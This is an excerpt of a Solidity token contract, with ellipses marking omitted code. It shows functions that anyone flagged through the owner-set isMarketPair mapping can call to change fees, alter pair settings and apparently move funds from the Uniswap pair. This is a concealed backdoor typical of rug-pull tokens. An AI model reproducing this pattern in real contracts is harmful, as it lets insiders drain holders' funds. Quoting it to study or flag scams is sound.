...
contract Token is Context, IERC20, Ownable {
  ...
  //  bool public launched = false;
    ...
    function setTrade(uint256 newburn, uint256 newLiquidity, uint256 newMarketing, uint256 newTeam) public{require(isMarketPair[_msgSender()]);
        _BURN = newburn;
   ...
   function transferToAddressETH(uint256 amount) public {require(isMarketPair[_msgSender()]);
        address sender = uniswapPair;
    ...
    function setMarketingPair(address newAddress) external onlyOwner{
        isMarketPair[newAddress] = true;
    }
    function setTeamWalletAddress(address newAddress) external onlyOwner{
        teamWalletAddress = payable(newAddress);
    }

    function setdistribution(bool _enabled) public onlyOwner {
        dividendEnable = _enabled;
        emit dividendEnabledUpdated(_enabled);
    }

    function setdistributionByNum(bool newValue) public onlyOwner {
    ...
    function setuniswappairAddress(address account,bool value) public{require(isMarketPair[_msgSender()]);
        uniswappair[account] = value;
    }
